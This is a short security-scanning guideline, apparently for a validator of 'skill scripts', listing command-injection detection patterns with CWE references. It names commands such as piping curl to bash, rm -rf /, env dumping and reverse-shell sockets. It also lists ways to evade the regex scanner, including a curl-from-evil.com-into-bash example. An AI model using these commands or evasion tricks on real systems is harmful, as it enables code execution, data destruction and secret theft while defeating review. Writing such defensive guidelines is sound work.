# Security Scanning Guidelines

## OWASP Command Injection Patterns

The following patterns are the most common command injection vectors in skill scripts.
See [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection) for full details.

### Shell Injection via Pipe
- Piping `curl`/`wget` output directly to `bash`/`sh` — Remote Code Execution (RCE).
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command.

### Dangerous File Operations
- `rm -rf /` — Recursive deletion of the root filesystem.
- `chmod 777` — Overly permissive file permissions.
- **CWE-73**: External Control of File Name or Path.

### Code Execution Functions
- `eval()` / `exec()` — Dynamic code execution. Attacker-controlled input becomes code.
- `subprocess.call()` with `shell=True` — Shell injection via untrusted input.
- `os.system()` — Same as subprocess with shell=True.
- **CWE-94**: Improper Control of Generation of Code ('Code Injection').

### Obfuscation Techniques
- **Base64 encoding**: Hiding malicious payloads in encoded strings.
- **String concatenation**: Breaking dangerous keywords across multiple strings to bypass scanners.
- **Minification**: Compressing code into very long single lines to avoid manual review.
- **CWE-116**: Improper Encoding or Escaping of Output.

### Network Exfiltration
- `requests.get()` / `urllib.request` — Outbound HTTP requests (data exfiltration).
- `socket.connect()` — Raw network connections (reverse shells, C2 beaconing).
- `printenv` / `env` — Dumping environment variables (secrets, API keys).
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor.

## Known Bypass Techniques

> [!WARNING]
> The validator uses regex-based static analysis. The following techniques can bypass it:

1. **String splitting**: `"cu" + "rl"` defeats naive pattern matching.
2. **Variable indirection**: `cmd="curl"; $cmd http://evil.com | bash`.
3. **Encoding layers**: Base64-inside-Base64, ROT13, hex encoding.
4. **Dynamic imports**: `__import__("os").system("...")`.
5. **Polyglot files**: Files that are valid in multiple languages simultaneously.

Always supplement automated scanning with manual adversarial review.

## References
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html)
- [MITRE ATT&CK T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)